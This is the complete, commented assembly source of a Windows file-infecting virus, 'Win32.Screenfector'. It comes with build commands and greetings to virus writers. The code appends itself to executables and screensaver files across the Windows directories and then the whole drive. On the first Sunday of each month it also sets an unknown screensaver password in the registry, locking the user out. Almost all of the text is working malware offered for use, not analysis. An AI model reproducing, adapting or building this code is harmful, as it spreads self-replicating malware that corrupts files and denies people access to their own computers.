; Å-----------
;    Win32.Screenfector by MalFunction
;
; hi out there! this is my first little win32 infector. there's nothing
; special at it, no new technique, no new way of infecting. yes, it is
; a very poor coded direct action infector. :(
; BUT: have you ever heard of mcafee's silly feature 'scanning while
; the screensaver runs'?
; this virus is the answer to that feature. an infected exe-file
; will infect only scr-filez in the %windir% and %windir%\system directoriez.
; an infected scr-file will create a new thread for infecting and then
; immediately return to the host. the created thread infectz the whole
; HD usin' a dir traversal. i know it's slow and makes the user
; suspicious, but it's funny: a virus that infectz during the screensaver ...
;                                                          -------Å
; thanx 'n' greetz:
; -----------------
;
; Wang_E: i'm sure that u'll have yer own OS one day.
;         thx for all da help, my friend!
; BlackArt: yeah, I'm still codin' that trojan ...
; Evil_Byte: Mittlerweile schon mal "Mirror, Mirror" von
;            Blind Guardian geh”rt? ;)
; Benny/29A: all yer tutes in 29a#4 rox!
; Lord Julus: vx-tasy#1 is one of the best ezines i have ever seen
;
;
; compile with: tasm32.exe /m9 /ml screenf.asm
;               tlink32.exe /aa /Tpe /c /x screenf.obj,,,import32.lib
;               pewrite.exe screenf.exe
;
;               (PEWrite is part of Lord Julus' VX-tasy#1)


.386
.model flat

        extrn MessageBoxA:proc
        extrn ExitProcess:proc
        extrn GetProcAddress:proc
        extrn GetModuleHandleA:proc

.data
        dummy_title DB "senseless dummy prog v1.01",0
        dummy_msg   DB "dummy prog carrying a little win32 infector...",0

.code

dummy:
        push 0                                  ; just a dummy ...
        push offset dummy_title
        push offset dummy_msg
        push 0
        call MessageBoxA

        push 0
        call ExitProcess

        v_size = v_end - v_start

v_start:                                        ; gimme that delta
        call delta
delta:
        pop ebp
        jmp over_var                            ; variables part I

        filehandle DD ?
        maphandle DD ?
        mapaddr DD ?
        mapsize DD ?

        keyhandle DD ?
        value1 DD 1

        hmodule DD ?
        oldEIP DD ?
        filealign DD ?

        k32name DB "KERNEL32",0
        advapiname DB "ADVAPI32",0
        procsfound DB 0

        searchmask DB "*.SCR",0
        wildcard DB "*.*",0
        root DB '\',0
        nested DB 0
        dotdot DB "..",0

        fnhandle DD ?
        fnhandle2 DD ?

        threadID DD ?

        _alloc DD ?

        ptrGetProcAddress   DD ?
        ptrGetModuleHandleA DD ?

        filetype DB 'E'

        _GetProcAddress   DB "GetProcAddress",0
        _GetModuleHandleA DB "GetModuleHandleA",0

APIs:
        GetWindowsDirectoryA DD ?
        GetCurrentDirectoryA DD ?
        SetCurrentDirectoryA DD ?
        GetSystemDirectoryA DD ?
        GetCommandLineA DD ?
        GetSystemTime DD ?
        ExitThread DD ?
        CreateThread DD ?
        CloseHandle DD ?
        UnmapViewOfFile DD ?
        MapViewOfFile DD ?
        SetFileAttributesA DD ?
        CreateFileMappingA DD ?
        CreateFileA DD ?
        FindNextFileA DD ?
        FindFirstFileA DD ?
        VirtualAlloc DD ?
        LoadLibraryA DD ?

        RegSetValueExA DD ?

over_var:
        DB 0b8h  ; mov eax,imm32                ; save old EIP
        oldEIP2 DD offset dummy
        mov [ebp+oldEIP-delta],eax

        DB 0b8h  ; mov eax,imm32                ; trace to import table
        baseaddress DD 00400000h        
        add eax,[eax+3ch]
        add eax,80h
        mov eax,[eax]
        add eax,[ebp+baseaddress-delta]
import1:
        cmp dword ptr [eax],0                   ; last import descriptor?
        jz quit

        mov esi,[eax+0Ch]
        add esi,[ebp+baseaddress-delta]

        lea edi,[ebp+k32name-delta]             ; is it kernel32?
        push 2
        pop ecx
        rep cmpsd
        jz import2
        add eax,14h
        jmp import1

import2:
        mov ebx,[eax]                           ; search for the needed API
        mov edx,[eax+10h]                       ; addresses ...
        add ebx,[ebp+baseaddress-delta]
        add edx,[ebp+baseaddress-delta]

import3:
        cmp dword ptr [ebx],0
        jz no_more_imp

        mov esi,[ebx]
        add esi,[ebp+baseaddress-delta]
        inc esi
        inc esi
        push esi

        lea edi,[ebp+_GetProcAddress-delta]     ; is it GetProcAddress?
        push 14
        pop ecx
        rep cmpsb
        jnz no_store1
        mov edi,[edx]
        mov [ebp+ptrGetProcAddress-delta],edi
        inc byte ptr [ebp+procsfound-delta]

no_store1:
        lea edi,[ebp+_GetModuleHandleA-delta]   ; is it GetModuleHandleA?
        push 4
        pop ecx
        pop esi
        rep cmpsd
        jnz no_store2
        mov edi,[edx]
        mov [ebp+ptrGetModuleHandleA-delta],edi
        inc byte ptr [ebp+procsfound-delta]

no_store2:
        add ebx,4
        add edx,4
        jmp import3
       
no_more_imp:
        cmp byte ptr [ebp+procsfound-delta],2   ; both APIaddresses found?
        jnz quit
        mov byte ptr [ebp+procsfound-delta],0

        lea eax,[ebp+k32name-delta]             ; gimme k32 base
        push eax
        call [ebp+ptrGetModuleHandleA-delta]
        mov [ebp+hmodule-delta],eax

        push 18
        pop ecx
        lea edi,[ebp+APIs-delta]
        lea esi,[ebp+ptr_table-delta]
get_APIs:                                       ; retrieve all needed APIz
        lodsd
        add eax,ebp
        sub eax,offset delta
        push ecx
        push edi
        push esi
        push eax
        push dword ptr [ebp+hmodule-delta]
        call [ebp+ptrGetProcAddress-delta]
        pop esi
        pop edi
        pop ecx
        test eax,eax
        jz quit
        stosd
        loop get_APIs

        push 40h                                ; allocate 1000 bytes
        push 1000h
        push 1000
        push 0
        call [ebp+VirtualAlloc-delta]
        test eax,eax
        jz quit
        mov [ebp+_alloc-delta],eax

        add eax,580                             ; get system time
        push eax
        push eax
        call [ebp+GetSystemTime-delta]
        pop eax
        cmp word ptr [eax+4],0                  ; sunday?
        jnz no_payload
        cmp word ptr [eax+6],7                  ; 1st sunday of month?
        ja no_payload

        lea eax,[ebp+advapiname-delta]          ; load advapi32.dll
        push eax
        call [ebp+LoadLibraryA-delta]
        test eax,eax
        jz no_payload

        push eax                                ; get RegOpenKeyExA address
        lea ebx,[ebp+_RegOpenKeyExA-delta]
        push ebx
        push eax
        call [ebp+ptrGetProcAddress-delta]

        lea ebx,[ebp+keyhandle-delta]           ; open the reg key
        push ebx
        push 001f0000h
        push 0
        lea ebx,[ebp+regkey-delta]
        push ebx
        push 80000001h
        call eax

        pop eax                                 ; get RegSetValueExA address
        lea ebx,[ebp+_RegSetValueExA-delta]
        push ebx
        push eax
        call [ebp+ptrGetProcAddress-delta]
        mov [ebp+RegSetValueExA-delta],eax

        push 25                                 ; set screensaver pwd
        lea ebx,[ebp+value2-delta]
        push ebx
        push 3
        push 0
        lea ebx,[ebp+value2name-delta]
        push ebx
        push dword ptr [ebp+keyhandle-delta]
        call eax

        push 4                                  ; enable screensaver pwd
        lea eax,[ebp+value1-delta]
        push eax
        push 4
        push 0
        lea eax,[ebp+value1name-delta]
        push eax
        push dword ptr [ebp+keyhandle-delta]
        call [ebp+RegSetValueExA-delta]

no_payload:
        mov eax,[ebp+_alloc-delta]              ; get current dir
        add eax,320
        push eax
        push 260
        call [ebp+GetCurrentDirectoryA-delta]

        cmp byte ptr [ebp+filetype-delta],'E'   ; is an EXE or a SCR executed?
        jnz screen_save

its_exe:
        mov dword ptr [ebp+searchmask+1-delta],'RCS.'   ; set for findfile
        mov byte ptr [ebp+filetype-delta],'S'

        mov eax,[ebp+_alloc-delta]              ; infect windoze dir
        push eax
        push 320
        push eax
        call [ebp+GetWindowsDirectoryA-delta]
        call [ebp+SetCurrentDirectoryA-delta]
        call infect_dir

        mov eax,[ebp+_alloc-delta]              ; infect windoze\system dir
        push eax
        push 320
        push eax
        call [ebp+GetSystemDirectoryA-delta]
        call [ebp+SetCurrentDirectoryA-delta]
        call infect_dir

        mov eax,[ebp+_alloc-delta]              ; go to old dir
        add eax,320
        push eax
        call [ebp+SetCurrentDirectoryA-delta]

quit:
        jmp [ebp+oldEIP-delta]                  ; jmp to host

screen_save:
        mov dword ptr [ebp+searchmask+1-delta],'EXE.'   ; set for findfile
        mov byte ptr [ebp+filetype-delta],'E'

        call [ebp+GetCommandLineA-delta]        ; get CommandLine
        mov edi,eax
        xor eax,eax
get_end:
        scasb
        jnz get_end

        cmp byte ptr [edi-2],'s'                ; was the parameter /s ?
        jz run_it                               ; (we don't want to infect
        cmp byte ptr [edi-2],'S'                ;  when scr is configurated)
        jz run_it
        jmp quit

run_it:
        mov [ebp+save_ebp-delta],ebp            ; save EBP for new thread

        lea eax,[ebp+threadID-delta]            ; create the infection thread
        push eax
        push 0
        push 0
        lea eax,[ebp+myThread-delta]
        push eax
        push 0
        push 0
        call [ebp+CreateThread-delta]

        jmp quit                                ; return to host

myThread:
        DB 0bdh    ; mov ebp,imm32              ; get delta handle
        save_ebp DD ?

        lea eax,[ebp+root-delta]                ; set root dir as current dir
        push eax
        call [ebp+SetCurrentDirectoryA-delta]

        call dirtrav                            ; INFECT!

        push 0
        call [ebp+ExitThread-delta]             ; exit the thread

dirtrav:
        call infect_dir                         ; infect directory

        push dword ptr [ebp+_alloc-delta]       ; find dir
        lea eax,[ebp+wildcard-delta]
        push eax
        call [ebp+FindFirstFileA-delta]
        push eax
        inc eax
        jz check_root
        dec eax
        mov [ebp+fnhandle-delta],eax
        jmp test_if_dir

findnextdir:
        push dword ptr [ebp+_alloc-delta]       ; find next dir
        push dword ptr [ebp+fnhandle-delta]
        call [ebp+FindNextFileA-delta]
        test eax,eax
        jz check_root

test_if_dir:
        mov eax,[ebp+_alloc-delta]
        test dword ptr [eax],10h                ; is it a directory?
        jz findnextdir
        mov eax,[ebp+_alloc-delta]
        add eax,44
        cmp byte ptr [eax],'.'                  ; is it '.' or '..'?
        jz findnextdir

        push eax
        call [ebp+SetCurrentDirectoryA-delta]   ; go to found dir
        inc byte ptr [ebp+nested-delta]
        call dirtrav                            ; recursive!
        mov eax,[esp]
        mov [ebp+fnhandle-delta],eax
        jmp findnextdir

check_root:
        cmp byte ptr [ebp+nested-delta],0       ; are we at root?
        jz end_trav

        lea eax,[ebp+dotdot-delta]              ; go to '..'
        push eax
        call [ebp+SetCurrentDirectoryA-delta]
        dec byte ptr [ebp+nested-delta]
end_trav:
        add esp,4
        ret

infect_dir:
        push dword ptr [ebp+_alloc-delta]       ; find a file
        lea eax,[ebp+searchmask-delta]
        push eax
        call [ebp+FindFirstFileA-delta]
        inc eax
        jz no_more_filez
        dec eax
        mov [ebp+fnhandle2-delta],eax
        jmp infect_file

findnextfile:
        push dword ptr [ebp+_alloc-delta]       ; find next file
        push dword ptr [ebp+fnhandle2-delta]
        call [ebp+FindNextFileA-delta]
        test eax,eax
        jz no_more_filez       

infect_file:
        xor edx,edx
        mov eax,[ebp+_alloc-delta]
        mov eax,[eax+32]
        mov ecx,201
        div ecx
        test edx,edx
        jz findnextfile                         ; already infected?
        mov eax,[ebp+_alloc-delta]              ; (fsize modulo 201 = 0)
        mov eax,[eax+32]
        add eax,v_size                          ; align fsize to 201 ...
        push eax
        xor edx,edx
        div ecx
        pop eax
        sub edx,201
        neg edx
        add eax,edx
        mov [ebp+mapsize-delta],eax             ; ... and save it

        push 80h                                ; clear file attributes
        mov eax,[ebp+_alloc-delta]
        add eax,44
        push eax
        call [ebp+SetFileAttributesA-delta]
        test eax,eax
        jz findnextfile

        push 0                                  ; open file
        push 80h
        push 3
        push 0
        push 0
        push 0C0000000h
        mov eax,[ebp+_alloc-delta]
        add eax,44
        push eax
        call [ebp+CreateFileA-delta]
        inc eax
        jz findnextfile
        dec eax
        mov [ebp+filehandle-delta],eax

        push 0                                  ; map file part I
        push dword ptr [ebp+mapsize-delta]
        push 0
        push 4
        push 0
        push eax
        call [ebp+CreateFileMappingA-delta]
        test eax,eax
        jz closefile
        mov [ebp+maphandle-delta],eax

        push dword ptr [ebp+mapsize-delta]      ; map file part II
        push 0
        push 0
        push 2
        push eax
        call [ebp+MapViewOfFile-delta]
        test eax,eax
        jz closefile
        mov [ebp+mapaddr-delta],eax

        cmp word ptr [eax],'ZM'                 ; EXE signature?
        jnz unmap
        add eax,[eax+3ch]
        mov edx,[ebp+mapaddr-delta]
        cmp eax,edx
        jnae unmap

        mov edi,[ebp+_alloc-delta]
        add edx,[edi+32]
        cmp eax,edx
        ja unmap
        cmp dword ptr [eax],00004550h           ; PE signature?
        jnz unmap

        mov edx,[eax+28h]                       ; save entrypoint
        mov [ebp+oldEIP2-delta],edx
        mov edx,[eax+34h]
        mov [ebp+baseaddress-delta],edx         ; save base address
        add [ebp+oldEIP2-delta],edx
        mov edx,[eax+3ch]                       ; save file alignment
        mov [ebp+filealign-delta],edx

        mov esi,[eax+74h]                       ; go to the last section header
        shl esi,3
        movzx ebx,word ptr [eax+6]
        dec ebx
        xchg eax,ebx
        imul eax,eax,28h
        lea esi,[esi+eax+78h]
        add esi,ebx

        or dword ptr [esi+24h], 0E0000020h      ; set characteristix

        add dword ptr [esi+8],v_size            ; correct VirtualSize
        mov eax,[esi+8]

        xor edx,edx                             ; calculate new RawSize
        mov ecx,[ebp+filealign-delta]
        div ecx
        test edx,edx
        jz no_inc
        inc eax
no_inc:
        mul ecx
        mov edx,eax
        sub edx,[esi+10h]
        add [ebx+50h],edx                       ; add increase to image size
        mov [esi+10h],eax                       ; save new RawSize

        push esi

        mov edi,[esi+8]                         ; prepare to copy virus
        add edi,[esi+14h]
        sub edi,v_size
        add edi,[ebp+mapaddr-delta]

        mov ecx,v_size                          ; copy it!
        lea esi,[ebp+v_start-delta]
        rep movsb

        pop esi                                 ; save new entrypoint
        mov edi,[esi+8]
        add edi,[esi+0ch]
        sub edi,v_size
        mov [ebx+28h],edi

unmap:
        push dword ptr [ebp+mapaddr-delta]      ; unmap file
        call [ebp+UnmapViewOfFile-delta]

closefile:
        push dword ptr [ebp+filehandle-delta]   ; and close it
        call [ebp+CloseHandle-delta]

        mov eax,[ebp+_alloc-delta]              ; restore old attribs
        push eax
        add eax,44
        push eax
        call [ebp+SetFileAttributesA-delta]

        jmp findnextfile

no_more_filez:
        ret
                                                ; variables part II
APInames:
        _GetWindowsDirectoryA DB "GetWindowsDirectoryA",0
        _GetCurrentDirectoryA DB "GetCurrentDirectoryA",0
        _SetCurrentDirectoryA DB "SetCurrentDirectoryA",0
        _GetSystemDirectoryA DB "GetSystemDirectoryA",0
        _GetCommandLineA DB "GetCommandLineA",0
        _GetSystemTime DB "GetSystemTime",0
        _ExitThread DB "ExitThread",0
        _CreateThread DB "CreateThread",0
        _CloseHandle DB "CloseHandle",0
        _UnmapViewOfFile DB "UnmapViewOfFile",0
        _MapViewOfFile DB "MapViewOfFile",0
        _SetFileAttributesA DB "SetFileAttributesA",0
        _CreateFileMappingA DB "CreateFileMappingA",0
        _CreateFileA DB "CreateFileA",0
        _FindNextFileA DB "FindNextFileA",0
        _FindFirstFileA DB "FindFirstFileA",0
        _VirtualAlloc DB "VirtualAlloc",0
        _LoadLibraryA DB "LoadLibraryA",0

        _RegSetValueExA DB "RegSetValueExA",0
        _RegOpenKeyExA DB "RegOpenKeyExA",0

ptr_table:
        DD offset _GetWindowsDirectoryA
        DD offset _GetCurrentDirectoryA
        DD offset _SetCurrentDirectoryA
        DD offset _GetSystemDirectoryA
        DD offset _GetCommandLineA
        DD offset _GetSystemTime
        DD offset _ExitThread
        DD offset _CreateThread
        DD offset _CloseHandle
        DD offset _UnmapViewOfFile
        DD offset _MapViewOfFile
        DD offset _SetFileAttributesA
        DD offset _CreateFileMappingA
        DD offset _CreateFileA
        DD offset _FindNextFileA
        DD offset _FindFirstFileA                                                    
        DD offset _VirtualAlloc
        DD offset _LoadLibraryA

        regkey DB "Control Panel\desktop",0
        value1name DB "ScreenSaveUsePassword",0
        value2 DB 31h,42h,41h,44h,32h,34h,35h,38h,32h,32h,32h,37h,45h
               DB 37h,35h,45h,33h,39h,44h,38h,30h,38h,41h,41h,00h
        value2name DB "ScreenSave_Data",0

v_end:

end v_start
